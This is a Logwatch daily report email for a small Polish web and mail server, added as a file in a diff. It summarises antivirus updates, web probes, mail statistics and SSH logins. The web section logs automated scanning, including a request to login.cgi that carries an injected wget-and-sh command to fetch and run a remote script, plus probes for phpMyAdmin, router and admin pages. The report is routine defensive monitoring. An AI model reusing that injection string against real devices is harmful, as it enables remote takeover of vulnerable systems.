@@ -1,0 +1,142 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id BB1219F200D8; Sat, 21 Jul 2018 03:35:14 +0200 (CEST)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20180721013514.BB1219F200D8@hrankiety.pl>
+Date: Sat, 21 Jul 2018 03:35:10 +0200 (CEST)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Sat Jul 21 03:35:10 2018
+        Date Range Processed: yesterday
+                              ( 2018-Jul-20 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Fri Jul 20 03:09:13 2018
+ 
+ Last Status:
+    WARNING: Your ClamAV installation is OUTDATED!
+    WARNING: Local version: 0.100.0 Recommended version: 0.100.1
+    DON'T PANIC! Read https://www.clamav.net/documents/upgrading-clamav
+    main.cvd is up to date (version: 58, sigs: 4566249, f-level: 60, builder: sigmgr)
+    nonblock_connect: connect(): fd=5 errno=99: Cannot assign requested address
+    Can't connect to port 80 of host db.local.clamav.net (IP: 2400:cb00:2048:1::6810:b98a)
+    Downloading daily-24763.cdiff [100%]
+    Downloading daily-24764.cdiff [100%]
+    Downloading daily-24765.cdiff [100%]
+    daily.cld updated (version: 24765, sigs: 2019318, f-level: 63, builder: neo)
+    bytecode.cld is up to date (version: 325, sigs: 90, f-level: 63, builder: neo)
+    [LibClamAV] Detected duplicate databases /var/lib/clamav/main.cvd and /var/lib/clamav/main.cld, please manually remove one of them
+    Database updated (6585657 signatures) from db.local.clamav.net (IP: 104.16.189.138)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ A total of 2 sites probed the server 
+    185.222.211.18
+    195.88.209.150
+ 
+ Requests with error response codes
+    400 Bad Request
+       /: 4 Time(s)
+       /GponForm/diag_Form?images/: 1 Time(s)
+       /login.cgi?cli=aa%20aa%27;wget%20http://10 ... sh%20/tmp/k%27$: 3 Time(s)
+       null: 2 Time(s)
+    404 Not Found
+       /HNAP1: 1 Time(s)
+       /MyAdmin/scripts/setup.php: 1 Time(s)
+       /evox/about: 1 Time(s)
+       /manager/html: 1 Time(s)
+       /myadmin/scripts/setup.php: 1 Time(s)
+       /nmaplowercheck1532037704: 1 Time(s)
+       /phpMyAdmin/scripts/setup.php: 1 Time(s)
+       /phpmyadmin/scripts/setup.php: 1 Time(s)
+       /pma/scripts/setup.php: 1 Time(s)
+       /sdk: 1 Time(s)
+       /w00tw00t.at.blackhats.romanian.anti-sec:): 1 Time(s)
+       /wp-login.php: 2 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+       60   *Warning: Pre-queue content-filter connection overload 
+     7042   SASL authentication failed 
+       40   Miscellaneous warnings 
+ 
+  511.504K  Bytes accepted                           523,780
+  505.443K  Bytes delivered                          517,574
+ ========   ================================================
+ 
+       21   Accepted                                  80.77%
+        5   Rejected                                  19.23%
+ --------   ------------------------------------------------
+       26   Total                                    100.00%
+ ========   ================================================
+ 
+        5   Reject HELO/EHLO                         100.00%
+ --------   ------------------------------------------------
+        5   Total Rejects                            100.00%
+ ========   ================================================
+ 
+     7104   Connections made      
+     7104   Disconnections        
+       21   Removed from queue    
+       18   Delivered             
+        1   Sent via SMTP         
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+        1   Timeout (inbound)     
+        1   SMTP protocol violations 
+        1   SASL authenticated messages 
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 3 times
+       78.133.219.138: 1 time
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 3 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   23G   28G  45% /
+ none            512M  4.0K  512M   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
